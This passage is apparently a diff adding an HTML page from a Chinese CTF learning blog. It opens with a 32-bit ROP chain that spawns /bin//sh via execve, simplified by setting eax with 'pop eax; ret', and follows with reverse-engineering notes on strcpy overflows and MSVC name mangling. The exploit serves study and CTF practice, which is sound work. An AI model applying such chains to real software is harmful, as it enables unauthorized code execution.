4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">p += p32(0)+p32(0)+p32(0x080ea060) </span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # padding without overwrite ebx</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea068) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x08054250) # xor eax, eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0807b27f) # inc eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080493e1) # int 0x80</span><br></pre></td></tr></table></figure></p>
+<ol start="2">
+<li>p +&#x3D; pack(‘&lt;I’, 0x0807b27f) # inc eax ; ret一直在重复，我们可以利用pop eax,ret 实现设置eax的值为11（0xB）</li>
+</ol>
+<p>   化简2：<br>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;/bin&#x27; </span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e82a) # pop edx ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea064) # @ .data + 4</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += b&#x27;//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0809a15d) # mov dword ptr [edx], eax ; ret</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x0806e850) # pop edx ; pop ecx ; pop ebx ; ret</span><br><span class="line">p += p32(0)+p32(0)+p32(0x080ea060) </span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080ea060) # padding without overwrite ebx</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080bae06) # pop eax ; ret</span><br><span class="line">p += p32(0xb)</span><br><span class="line">p += pack(&#x27;&lt;I&#x27;, 0x080493e1) # int 0x80</span><br></pre></td></tr></table></figure></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://linkpwn.github.io/2025/02/26/re%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E4%BF%A1%E6%81%AF-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="linkpwn">
+      <meta itemprop="description" content="linkpwn的学习经历">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="网络幻影">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/02/26/re%E9%83%A8%E5%88%86%E8%A7%A3%E9%A2%98%E4%BF%A1%E6%81%AF-%E6%8C%81%E7%BB%AD%E6%9B%B4%E6%96%B0/" class="post-title-link" itemprop="url">re部分解题信息(持续更新)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-02-26 20:12:15 / 修改时间：20:14:39" itemprop="dateCreated datePublished" datetime="2025-02-26T20:12:15+08:00">2025-02-26</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h3 id="一"><a href="#一" class="headerlink" title="一"></a>一</h3><p>unity游戏的核心逻辑一般位于assets\bin\Data\Managed\Assembly-CSharp.dll</p>
+<h3 id="二"><a href="#二" class="headerlink" title="二"></a>二</h3><p>strcpy(Destination, Source);<br>strcpy(x, Source);<br>栈溢出的类型，先用x找到溢出的地址</p>
+<h3 id="三"><a href="#三" class="headerlink" title="三"></a>三</h3><p>UnDecorateSymbolName()函数：<br>该函数第一个参数为输出地址、第二个参数为未修饰的名字、第三个参数为长度、第四个参数为0表示完全修饰；<br>以下所有资料摘自：<a target="_blank" rel="noopener" href="https://blog.csdn.net/liweigao01/article/details/78351464">https://blog.csdn.net/liweigao01/article/details/78351464</a><br>资料一：<br>无论 __cdecl，__fastcall还是__stdcall调用方式，函数修饰都是以一个“?”開始，后面紧跟函数的名字。<br>再后面是參数表的開始标识和 依照參数类型代号拼出的參数表。<br>资料二：<br>对于C++的类成员函数（其调用方式是thiscall）。<br>函数的名字修饰与非成员的C++函数稍有不同，首先就是在函数名字和參数表之间插入以“@”字 符引导的类名。<br>资料三：</p>
+<p>其次是參数表的開始标识不同，公有（public）成员函数的标识是“@@QAE”,保护（protected）成员函数的标识是 “@@IAE”,私有（private）成员函数的标识是“@@AAE”，<br>假设函数声明使用了constkeyword，则对应的标识应分别为 “@@QBE”，“@@IBE”和“@@ABE”。</p>
+<p>资料四：<br>參数表的拼写代号例如以下所看到的：<br>X–void<br>D–char<br>E–unsigned char<br>F–short<br>H–int<br>I–unsigned int<br>J–long<br>K–unsigned long（DWORD）<br>M–float<br>N–double<br>_N–bool<br>U–struct<br>….<br>指针的方式有些特别。用PA表示指针，用PB表示const类型的指针。</p>
+<h3 id="四"><a href="#四" class="headerlink" title="四"></a>四</h3><p>dword 是双字，4个才是一个数据，所以当你用IDA时要用，initialized C variable。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+
+  
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+  </nav>
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="linkpwn"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">linkpwn</p>
+  <div class="site-description" itemprop="description">linkpwn的学习经历</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">36</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/linkpwn" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:dkj20060328@qq.com" title="E-Mail → mailto:dkj20060328@qq.com" rel="noopener" target="_blank"><i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/linkpwn" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;linkpwn" rel="noopener" target="_blank"><i class="fa fa-fw fa-weibo"></i>Weibo</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          <span>0%</span>
+        </div>
+          <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=1827600686&auto=1&height=66"></iframe>
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">linkpwn</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
+
+<!--单击显示文字-->
+<script type="text/javascript" src="/js/clickshowtext.js"></script>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/clicklove.js"></script>
+
+<canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+<script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+<script type="text/javascript" src="/js/fireworks.js"></script>
